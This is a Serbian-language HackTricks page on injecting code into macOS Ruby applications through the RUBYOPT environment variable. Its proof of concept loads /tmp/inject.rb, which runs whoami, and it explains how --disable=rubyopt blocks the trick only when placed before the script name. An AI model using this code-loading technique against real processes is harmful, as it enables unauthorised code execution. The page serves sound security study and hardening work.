# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby parsira podržane switch-eve komandne linije iz environment variable-a `RUBYOPT` pre pokretanja script-a. Ruby odbija izvršavanje koda putem `-e` u `RUBYOPT`, ali `-I` može dodati direktorijum za pretragu library-ja, a `-r` može zahtevati library. Proces koji pokreće Ruby sa environment variable-ima pod kontrolom attacker-a zato može biti nateran da učita Ruby code pod kontrolom attacker-a.<sup>[[1]](#references)</sup>

Kreirajte `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Kreirajte bezopasnu Ruby skriptu, kao što je `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Pokrenite ga sa kontrolisanom vrednošću `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Da biste onemogućili ovo ponašanje, prosledite `--disable=rubyopt` (ili `--disable-rubyopt`) **pre** imena skripte:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Opcija navedena nakon `hello.rb` prosleđuje se skripti u `ARGV`; ona ne onemogućava prethodnu Ruby obradu promenljive `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Ruby dokumentacija - Ruby opcije komandne linije](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
